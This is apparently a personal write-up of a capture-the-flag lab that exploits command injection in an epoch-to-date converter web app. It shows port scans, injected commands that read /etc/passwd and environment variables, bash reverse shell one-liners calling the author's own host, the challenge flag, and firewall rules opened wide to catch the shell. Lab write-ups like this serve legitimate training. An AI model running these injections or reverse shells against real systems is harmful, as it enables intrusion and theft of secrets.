---
Be honest, you have always wanted an online tool that could help you convert UNIX dates and timestamps! 
---

![|222](https://tryhackme-images.s3.amazonaws.com/room-icons/1f93210b470f836c38121fc3f65c0807.png)

Be honest, you have always wanted an online tool that could help you convert UNIX dates and timestamps! Wait... it doesn't need to be online, you say? Are you telling me there is a command-line Linux program that can already do the same thing? Well, of course, we already knew that! Our website actually just passes your input right along to that command-line program!

```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.152.153 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.152.153:22
Open 10.10.152.153:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-03 08:07 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:07
Completed NSE at 08:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:07
Completed NSE at 08:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:07
Completed NSE at 08:07, 0.00s elapsed
Initiating Ping Scan at 08:07
Scanning 10.10.152.153 [2 ports]
Completed Ping Scan at 08:07, 0.31s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:07
Completed Parallel DNS resolution of 1 host. at 08:07, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 08:07
Scanning 10.10.152.153 [2 ports]
Discovered open port 80/tcp on 10.10.152.153
Discovered open port 22/tcp on 10.10.152.153
Completed Connect Scan at 08:07, 0.31s elapsed (2 total ports)
Initiating Service scan at 08:07
Scanning 2 services on 10.10.152.153
Completed Service scan at 08:09, 109.75s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.152.153.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:09
Completed NSE at 08:09, 10.24s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:09
Completed NSE at 08:09, 2.64s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:09
Completed NSE at 08:09, 0.00s elapsed
Nmap scan report for 10.10.152.153
Host is up, received conn-refused (0.31s latency).
Scanned at 2022-11-03 08:07:11 EDT for 123s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 af695dc32298b11f01b345695ccee3fd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCiI9Pm5/JdTikUPrlKOjUt+seiwkw2tF0dKhIee8NhvAEYUoNK0m+D7D6wlehwE4+r+KSZ9B8niPEH1yyLmUbkIPRqsvVoBRSlW+1ScCmukNiRums5U7GLgojlLWOsMMA98CXi5a+A2J5p1bg+SsFSrcpsh06cC5gAkptZNWIu/HRw2bi3/+Y4AqCKdIDbAsTBNkKePXkHL6uK8X00h+GCZHSeCfqlafLD0zCdZ2raw8/10Ho0NqH/HX+gA0J+hcIxyJhuvsBR41+hQNW9h62w9LvD561qtnTkznqDIBV8AlA+KiFhBabD+i/1IYAihQH/dwC1AalKR3T2Q+nVOGUEmMv2zakikNN9ZG1HHbFsg8oh+tYvFVv2BXqw7pG1H5YL2Z+7XaseIhlSsv0H7zp6qOcxdGxihWY90bz7EcsYMpFJGShknLq9bBCCKJgJW5MwFmxwv64NYKFOzfWldND5WJdrfPxv8Cb03+Lagbti53U7s5fS809AHHPQEg48tGU=
|   256 9e27517f04b65548a9c5e217ce8d44ca (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG0Sbemiz0kgngKCLGA7Fiu5k77/+qKMfO7r9YbDgtT9bFADM2UoJOri8DxFY0nXWdBYaSA4LwRjCFmjTa2oGp0=
|   256 beb203b521750a172b7c963b6c33c618 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP602tXmp7XgY+uXLgUeNbFZ4NwOSzdFeKGfKLFs4rKp
80/tcp open  http    syn-ack
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Thu, 03 Nov 2022 12:07:17 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1184
|     Connection: close
|     <!DOCTYPE html>
|     <head>
|     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
|     integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
|     <style>
|     body,
|     html {
|     height: 100%;
|     </style>
|     </head>
|     <body>
|     <div class="container h-100">
|     <div class="row mt-5">
|     <div class="col-12 mb-4">
|     class="text-center">Epoch to UTC convertor 
|     </h3>
|     </div>
|     <form class="col-6 mx-auto" action="/">
|     <div class=" input-group">
|     <input name="epoch" value="" type="text" class="form-control" placeholder="Epoch"
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     Date: Thu, 03 Nov 2022 12:07:18 GMT
|     Content-Type: text/plain; charset=utf-8
|     Content-Length: 18
|     Allow: GET, HEAD
|     Connection: close
|     Method Not Allowed
|   RTSPRequest: 
|     HTTP/1.1 405 Method Not Allowed
|     Date: Thu, 03 Nov 2022 12:07:19 GMT
|     Content-Type: text/plain; charset=utf-8
|     Content-Length: 18
|     Allow: GET, HEAD
|     Connection: close
|_    Method Not Allowed
| http-methods: 
|_  Supported Methods: GET HEAD
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.93%I=7%D=11/3%Time=6363AEF7%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,529,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2003\x20Nov\x20202
SF:2\x2012:07:17\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\
SF:nContent-Length:\x201184\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20ht
SF:ml>\n\n<head>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"ht
SF:tps://stackpath\.bootstrapcdn\.com/bootstrap/4\.5\.2/css/bootstrap\.min
SF:\.css\"\n\x20\x20\x20\x20\x20\x20\x20\x20integrity=\"sha384-JcKb8q3iqJ6
SF:1gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP\+VmmDGMN5t9UJ0Z\"\x20crossorigin
SF:=\"anonymous\">\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20body,\n\x20\x20\x20\x20\x20\x20\x20\x20html\x20{\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20height:\x20100%;\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20}\n\x20\x20\x20\x20</style>\n</head>\n\n<body>\n\x20\x20\x20\x
SF:20<div\x20class=\"container\x20h-100\">\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20<div\x20class=\"row\x20mt-5\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20<div\x20class=\"col-12\x20mb-4\">\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3\x20class=\"text-center\">Epo
SF:ch\x20to\x20UTC\x20convertor\x20\xe2\x8f\xb3</h3>\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20<form\x20class=\"col-6\x20mx-auto\"\x20action=\"/\">\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20cla
SF:ss=\"\x20input-group\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20<input\x20name=\"epoch\"\x20value=\"\
SF:"\x20type=\"text\"\x20class=\"form-control\"\x20placeholder=\"Epoch\"\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0")%r(HTTPOptions,BC,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nD
SF:ate:\x20Thu,\x2003\x20Nov\x202022\x2012:07:18\x20GMT\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nContent-Length:\x2018\r\nAllow:\x20GE
SF:T,\x20HEAD\r\nConnection:\x20close\r\n\r\nMethod\x20Not\x20Allowed")%r(
SF:RTSPRequest,BC,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x
SF:20Thu,\x2003\x20Nov\x202022\x2012:07:19\x20GMT\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nContent-Length:\x2018\r\nAllow:\x20GET,\x20
SF:HEAD\r\nConnection:\x20close\r\n\r\nMethod\x20Not\x20Allowed");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:09
Completed NSE at 08:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:09
Completed NSE at 08:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:09
Completed NSE at 08:09, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.37 seconds

https://www.epochconverter.com/

1667477237;ls


Thu Nov  3 12:07:17 UTC 2022
go.mod
go.sum
main
main.go
views

┌──(kali㉿kali)-[~]
└─$ date '+%s'
1667483948

┌──(kali㉿kali)-[~]
└─$ date -d @1667483948
Thu Nov  3 09:59:08 AM EDT 2022


1667477237;which python
exit status 1

1667477237;which bash
cnnot get a revshell

date -d @1667483948 && bash -i >& /dev/tcp/10.8.19.103/443 0>&1
:(
Thu Nov  3 12:07:17 UTC 2022
/usr/bin/bash

or just ; | 

;env
| env
| printenv

date -d @1667483948;cat ../../etc/passwd

Thu Nov  3 13:59:08 UTC 2022
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
challenge:x:1000:1000::/home/challenge:/bin/sh


date: invalid date '@'
HOSTNAME=e7c1352e71ec
PWD=/home/challenge
HOME=/home/challenge
GOLANG_VERSION=1.15.7
FLAG=flag{7da6c7debd40bd611560c13d8149b647}
SHLVL=1
PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env

date -d @1667483948 && echo $FLAG
Thu Nov  3 13:59:08 UTC 2022
flag{7da6c7debd40bd611560c13d8149b647}

using attackbox

;bash -i >& /dev/tcp/10.10.31.231/4444 0>&1

root@ip-10-10-31-231:~# nc -lvnp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 10.10.73.246 37898 received!
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
challenge@e7c1352e71ec:~$ echo $FLAG
echo $FLAG
flag{7da6c7debd40bd611560c13d8149b647}


it works, maybe need to fix my machine 😔 

solve it fixing my iptables and ufw I was blocking smb 🤣

┌──(kali㉿kali)-[~]
└─$ sudo ufw status
[sudo] password for kali: 
Status: active

To                         Action      From
--                         ------      ----
80                         ALLOW       Anywhere                  
22                         ALLOW       Anywhere                  
23                         ALLOW       Anywhere                  
145                        ALLOW       Anywhere                  
445                        ALLOW       Anywhere                  
139                        ALLOW       Anywhere                  
138                        ALLOW       Anywhere                  
137                        ALLOW       Anywhere                  
4444                       ALLOW       Anywhere                  
1337                       ALLOW       Anywhere                  
8080                       ALLOW       Anywhere                  
443                        ALLOW       Anywhere                  
1:65535/tcp                ALLOW       Anywhere                  
80 (v6)                    ALLOW       Anywhere (v6)             
22 (v6)                    ALLOW       Anywhere (v6)             
23 (v6)                    ALLOW       Anywhere (v6)             
145 (v6)                   ALLOW       Anywhere (v6)             
445 (v6)                   ALLOW       Anywhere (v6)             
139 (v6)                   ALLOW       Anywhere (v6)             
138 (v6)                   ALLOW       Anywhere (v6)             
137 (v6)                   ALLOW       Anywhere (v6)             
4444 (v6)                  ALLOW       Anywhere (v6)             
1337 (v6)                  ALLOW       Anywhere (v6)             
8080 (v6)                  ALLOW       Anywhere (v6)             
443 (v6)                   ALLOW       Anywhere (v6)             
1:65535/tcp (v6)           ALLOW       Anywhere (v6)   

using a range from 1 to 65535 max port scanning through rustscan, now testing printnightmare :)

sudo ufw allow 1:65535/tcp


┌──(kali㉿kali)-[~]
└─$ sudo iptables -L                
Chain INPUT (policy DROP)
target     prot opt source               destination         
ufw-before-logging-input  all  --  anywhere             anywhere            
ufw-before-input  all  --  anywhere             anywhere            
ufw-after-input  all  --  anywhere             anywhere            
ufw-after-logging-input  all  --  anywhere             anywhere            
ufw-reject-input  all  --  anywhere             anywhere            
ufw-track-input  all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
ACCEPT     all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere            

Chain FORWARD (policy DROP)
target     prot opt source               destination         
DOCKER-USER  all  --  anywhere             anywhere            
DOCKER-ISOLATION-STAGE-1  all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
DOCKER     all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
DOCKER     all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere            
ufw-before-logging-forward  all  --  anywhere             anywhere            
ufw-before-forward  all  --  anywhere             anywhere            
ufw-after-forward  all  --  anywhere             anywhere            
ufw-after-logging-forward  all  --  anywhere             anywhere            
ufw-reject-forward  all  --  anywhere             anywhere            
ufw-track-forward  all  --  anywhere             anywhere            

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
ufw-before-logging-output  all  --  anywhere             anywhere            
ufw-before-output  all  --  anywhere             anywhere            
ufw-after-output  all  --  anywhere             anywhere            
ufw-after-logging-output  all  --  anywhere             anywhere            
ufw-reject-output  all  --  anywhere             anywhere            
ufw-track-output  all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere      

sudo iptables -A INPUT -j ACCEPT
sudo iptables -A OUTPUT -j ACCEPT

; bash -i >& /dev/tcp/10.8.19.103/4443 0>&1

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nlvp 4443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4443
Ncat: Listening on 0.0.0.0:4443
Ncat: Connection from 10.10.175.160.
Ncat: Connection from 10.10.175.160:51852.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
challenge@e7c1352e71ec:~$ whoami
whoami
challenge
challenge@e7c1352e71ec:~$ env
env
HOSTNAME=e7c1352e71ec
PWD=/home/challenge
HOME=/home/challenge
LS_COLORS=
GOLANG_VERSION=1.15.7
FLAG=flag{7da6c7debd40bd611560c13d8149b647}
SHLVL=2
PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
challenge@e7c1352e71ec:~$ echo $FLAG
echo $FLAG
flag{7da6c7debd40bd611560c13d8149b647}


```

![[Pasted image 20221103071230.png]]

Find the flag in this vulnerable web application!
The developer likes to store data in environment variables, can you find anything of interest there?
*flag{7da6c7debd40bd611560c13d8149b647}*


[[Responder]]
